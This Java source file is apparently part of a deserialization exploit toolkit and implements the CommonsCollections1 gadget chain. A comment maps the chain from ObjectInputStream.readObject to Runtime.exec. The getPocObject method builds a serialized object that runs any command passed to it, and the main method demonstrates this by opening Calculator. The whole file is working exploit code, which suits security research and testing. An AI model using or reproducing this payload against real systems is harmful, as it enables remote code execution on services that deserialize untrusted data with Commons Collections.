package xyz.eki.marshalexp.poc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.jdk.GAnnotationInvocationHandler;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	Requires:
		commons-collections
 */
public class CC1 implements POC{
    @Override
    public Object getPocObject(String cmd) throws Exception {
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = ReflectUtils.createProxy(GAnnotationInvocationHandler.createMemoizedInvocationHandler(lazyMap), Map.class);

        final InvocationHandler handler = GAnnotationInvocationHandler.createMemoizedInvocationHandler(mapProxy);

        ReflectUtils.setFieldValue(transformerChain, "iTransformers", new Transformer[]{GCC.invokerTransformer2RCE(cmd)}); // arm with actual transformer chain

        return handler;
    }

    public static void main(String[] args) throws Exception{
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new CC1().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
